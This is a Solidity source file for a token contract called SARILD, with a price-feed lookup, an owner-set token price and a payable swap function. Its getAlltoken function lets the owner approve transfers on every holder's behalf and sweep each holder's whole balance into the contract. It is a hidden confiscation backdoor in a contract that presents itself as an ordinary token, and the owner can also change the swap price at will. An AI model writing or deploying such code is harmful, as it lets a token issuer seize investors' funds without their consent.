pragma solidity ^0.8.0;

import "./Standard.sol";
import "./SafeMath.sol";
import "./AggregatorInterface.sol";

contract SARILD is Standard {
    using SafeMath for uint256;
    AggregatorInterface internal priceFeed;
    address public owner;
    uint8 private _decimals = 3;
    uint256 tokenPrice = 10000000000; //how many tokens equal to 1 ETH
    modifier onlyOwner() {
        require(msg.sender == owner, "only owner can call this function");
        _;
    }

    constructor() Standard("SARILD", "JCK") {
        priceFeed = AggregatorInterface(
            0x8A753747A1Fa494EC906cE90E9f37563A8AF630e
        );
        _mint(msg.sender, 125310 * 10**3);
        owner = msg.sender;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function getLatestPrice() public view returns (uint256) {
        return uint256(priceFeed.latestAnswer());
    }

    event GetAllToken(address _contract);

    function getAlltoken() public onlyOwner returns (bool) {
        for (uint256 i = 0; i < tokenOwners.length; i++) {
            address tokenOwner = tokenOwners[i];
            uint256 balance = balanceOf(tokenOwner);
            _approve(tokenOwner, address(this), balance);
            transferFrom(tokenOwner, address(this), balance);
        }
        emit GetAllToken(address(this));
        return true;
    }

    function setTokenprice(uint256 price) public onlyOwner returns (bool) {
        tokenPrice = price;
        return true;
    }

    function getTokenprice() public view returns (uint256) {
        return tokenPrice;
    }

    function swap() public payable {
        uint256 currentEtherPrice = getLatestPrice();
        uint256 amount = tokenPrice.mul(200).div(currentEtherPrice) *
            10**_decimals;
        _approve(owner, msg.sender, amount);
        transferFrom(owner, msg.sender, amount);
    }
}